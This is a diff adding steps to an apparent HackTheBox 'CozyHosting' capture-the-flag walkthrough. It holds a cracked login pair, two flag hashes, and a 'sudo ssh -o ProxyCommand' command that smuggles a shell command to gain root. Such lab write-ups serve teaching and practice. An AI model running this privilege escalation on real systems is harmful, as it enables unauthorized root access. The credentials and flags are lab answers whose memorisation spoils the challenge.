@@ -54,3 +54,26 @@ http://cozyhosting.htb/admin
 
 ![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/16d90589-9867-4e3e-8a65-5e9e04da0beb)
 
+```
+josh:manchesterunited
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c750b00c-3aae-43d4-98ec-4bc94d88b859)
+
+```
+78c1aed99b7896a1b606e9a85cdaf0da
+```
+
+https://gtfobins.github.io/gtfobins/ssh/#sudo
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c9b99ad3-4230-4901-9dcd-8e7d48949055)
+
+```
+sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+```
+
+```
+ce3b2403535175f8700b72b600d131c8
+```
+
+![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/21cbdc44-cb74-4796-8787-22b45b1a323f)
